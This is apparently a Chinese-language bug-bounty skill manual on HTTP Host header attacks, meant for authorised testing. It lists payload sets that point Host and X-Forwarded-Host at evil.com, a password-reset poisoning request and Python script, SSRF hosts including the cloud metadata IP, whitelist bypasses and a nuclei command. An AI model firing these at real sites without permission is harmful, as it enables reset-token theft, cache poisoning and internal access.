# HTTP Host Header 攻击深度手册

← 回主入口 [../../SKILL.md](../../SKILL.md)

> **CWE**: CWE-20 / CWE-444 | **OWASP**: WSTG-CONF-07 / A05:2021
> **核心**: Web 应用盲信 `Host` 或 `X-Forwarded-Host` 等 header, 把它用于生成 URL / 路由 / 缓存键 / 邮件内容
> **回报**: 中-高, 密码重置投毒 / 缓存投毒类 $500-$10000+

---

## 0. First-pass Payload Set

```http
GET / HTTP/1.1
Host: evil.com

# Host header injection
Host: target.com
X-Forwarded-Host: evil.com

# @trick
Host: target.com@evil.com
Host: evil.com:80
Host: target.com:@evil.com

# multiple hosts
Host: target.com
Host: evil.com

# line folding (old bug, 很少中但值得一试)
Host: target.com
 evil.com

# CRLF via Host
Host: target.com%0D%0AX-Injection: yes
```

---

## 1. 识别目标场景

| 场景 | 观察点 |
|------|-------|
| 密码重置链接 | 收邮件看 URL host |
| 邮件通知 (邀请 / 验证 / 订单) | 同上 |
| OAuth / SSO callback 跳转 | 看 `Location` header 的 host |
| 反向代理的 vhost 路由 | 多域名映射到同一后端 |
| CDN / 反代 的缓存键 | 看缓存是否基于 Host |
| 应用内生成的 "绝对 URL" (SAML / OIDC metadata XML) | XML 内嵌的 URL |

---

## 2. 典型攻击模式

### 2.1 密码重置投毒 (Password Reset Poisoning)

**流程**:
1. 受害者(victim)请求找回密码
2. 攻击者抢先发同样请求, 但改 Host
3. 服务端生成重置链接使用攻击者 Host
4. 邮件发给 victim, 链接是 `https://evil.com/reset?token=TOKEN`
5. victim 点击, token 泄露给攻击者

```http
POST /forgot-password HTTP/1.1
Host: evil.com
X-Forwarded-Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@target.com
```

**关键检测**: 注册一个测试账号, 触发找回密码, 用 Burp 改 Host, 看邮件里链接是否变成攻击者域。

### 2.2 Web Cache Poisoning 入口

Host header 如果是 unkeyed header (不纳入缓存键), 但影响响应内容 → 可投毒给所有用户。

见 [cache-deception.md](cache-deception.md) (Cache Deception 家族)。

### 2.3 SSRF via Host

后端按 Host 做反向代理:

```http
Host: internal.target.com:8080
Host: 127.0.0.1:6379
Host: 169.254.169.254
```

### 2.4 访问控制绕过

```http
# 后端按 Host 区分管理接口:
#   admin.internal.target.com → 管理后台
# 外部看 public.target.com → 403
# 但若服务端按 Host 路由:
Host: admin.internal.target.com
→ 绕过 403
```

### 2.5 SAML / OIDC Metadata 污染

SSO endpoint 生成的 `EntityDescriptor` / `issuer` URL 带 Host:

```http
GET /saml/metadata HTTP/1.1
Host: evil.com
```

返回的 metadata 把 evil.com 当合法 entityID, 可用于 IdP 配置混淆 → 后续 SAML 攻击。

---

## 3. Header 变体矩阵

当 Host 本身被硬校验时, 试这些替代 header:

| Header | 说明 |
|--------|------|
| `X-Forwarded-Host` | 反代透传, 最常被盲信 |
| `X-Host` | Vue/React 自定义 |
| `X-Forwarded-Server` | Apache 特有 |
| `X-HTTP-Host-Override` | 个别框架 |
| `Forwarded: host=evil.com` | RFC 7239 |
| `X-Original-URL` | IIS + .NET |
| `X-Rewrite-URL` | Symfony |
| `X-Forwarded-Proto` (劫持 https→http 降级) | 缓存场景 |

---

## 4. 绕过 Host 白名单

| 防御 | 绕过 |
|------|------|
| 只校验 suffix `endsWith(".target.com")` | `Host: evil.com.target.com` (若 DNS 允许) / `Host: evil.target.com` |
| 只校验 prefix `startsWith("target.com")` | `Host: target.com.evil.com` |
| 纯字符串包含 `contains("target.com")` | `Host: evil.com?target.com` / `Host: eviltarget.com` |
| 解析后校验 hostname | `Host: target.com@evil.com` (某些 parser 只取 `@` 前) |
| Port 忽略校验 | `Host: target.com:80.evil.com` (少见, 偶中) |
| 不校验 `X-Forwarded-Host` | 直接用 X-Forwarded-Host |
| 解析 `:` 后的端口 | `Host: target.com:1234` 若后端按 port 做反代 |

---

## 5. 工具与自动化

### 5.1 手工 Burp

- Burp Match & Replace 规则把 Host 改成 evil.com (全局)
- Collaborator 替代 evil.com

### 5.2 Param Miner (Burp 插件)

- `Guess headers` 可发现 unkeyed headers
- `Guess identified params` 会测 X-Forwarded-Host 等变体

### 5.3 nuclei 模板

```bash
${NUCLEI_PATH}/nuclei.exe -t http/misconfiguration/host-header-injection/ -l urls.txt
```

### 5.4 自建脚本探测密码重置投毒

```python
import requests
def test_reset_poisoning(reset_url, email, evil_host):
    r = requests.post(reset_url,
        headers={"Host": evil_host, "X-Forwarded-Host": evil_host},
        data={"email": email})
    # 然后人工去邮箱看链接 host
    return r.status_code
```

---

## 6. Testing Checklist

- [ ] 所有"找回密码 / 邀请 / 激活 / 通知"邮件中的链接, Host 改包后看链接变没变
- [ ] `Host`, `X-Forwarded-Host`, `X-Host`, `Forwarded`, `X-Original-URL` 依次试
- [ ] 改 Host 为 Collaborator 子域, 看 CDN / 服务端是否出站请求 (SSRF 信号)
- [ ] 改 Host 为内网 IP (`127.0.0.1` / `169.254.169.254`), 看 SSRF
- [ ] 管理接口 / 内部接口若按 Host 路由, 试伪造 admin host
- [ ] SAML / OIDC metadata endpoint 改 Host, 检查返回的 entityID/issuer URL
- [ ] 多 Host header (`Host: a\r\nHost: b`) 看哪个生效

---

## 7. False Positive Traps

| 陷阱 | 真相 |
|------|------|
| Host 改成 evil.com 但返回 400 Bad Host | 后端有硬校验, 换 X-Forwarded-Host |
| 重置邮件 Host 未变 | 后端可能硬编码了正式 host, 只能试 X-Forwarded-Host |
| X-Forwarded-Host 改了但响应没变 | 仅 CDN 透传, 后端没用, 不算漏洞 |
| 注入后端 500 | 可能仅解析异常, 不等于可利用, 需后续证明实际影响 |
| 邮件里链接包含 `evil.com/reset?token=xxx` | 证据: 点击并看 attacker 服务器日志是否收到 token |

---

## 8. 影响证明

- **低**: Host 能改, 但未导致业务变化
- **中**: 响应 URL 里 host 被污染, 有潜在钓鱼风险
- **高**: 密码重置链接发到攻击者域 → token 泄露路径完整
- **严重**: 配合缓存投毒批量影响其他用户 / 配合 SAML 伪造 IdP

---

## 9. 相关参考

- 主入口 → [../../SKILL.md](../../SKILL.md)
- Cache Deception / Cache Poisoning → [cache-deception.md](cache-deception.md)
- SSRF → [ssrf.md](ssrf.md)
- CSRF / Clickjacking → [csrf-clickjacking.md](csrf-clickjacking.md)
- 认证与逻辑(密码重置) → [../auth-logic.md](../auth-logic.md)

---

**CWE**: CWE-20 / CWE-444 | **WSTG**: CONF-07 | **CVSS 典型**: 6.5 (密码重置投毒) / 8.1 (缓存投毒批量) / 7.5 (SSRF via Host)
